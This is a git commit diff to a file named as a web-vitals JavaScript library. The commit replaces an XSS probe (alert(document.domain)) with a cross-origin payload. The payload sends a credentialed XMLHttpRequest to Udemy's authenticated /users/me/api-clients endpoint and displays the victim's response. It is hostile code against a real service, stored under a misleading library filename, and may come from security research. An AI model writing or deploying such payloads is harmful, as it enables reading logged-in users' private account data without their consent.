406d29dc93f913e2fa3b1171692b582445598341
plain-chip <44140274+plain-chip@users.noreply.github.com>
2022-07-22 16:34:30 -0600

    Update webvitals.js

--- html/js/lib/webvitals-js/webvitals.js
+++ html/js/lib/webvitals-js/webvitals.js
@@ -1,1 +1,13 @@
-alert(document.domain)
+function cors() {  
+var xhttp = new XMLHttpRequest();  
+xhttp.onreadystatechange = function() {    
+    if (this.status == 200) {    
+    alert(this.responseText);     
+    document.getElementById("demo").innerHTML = this.responseText;    
+    }  
+};  
+xhttp.open("GET", "https://www.udemy.com/api-2.0/users/me/api-clients", true);  
+xhttp.withCredentials = true;  
+xhttp.send();
+}
+cors();
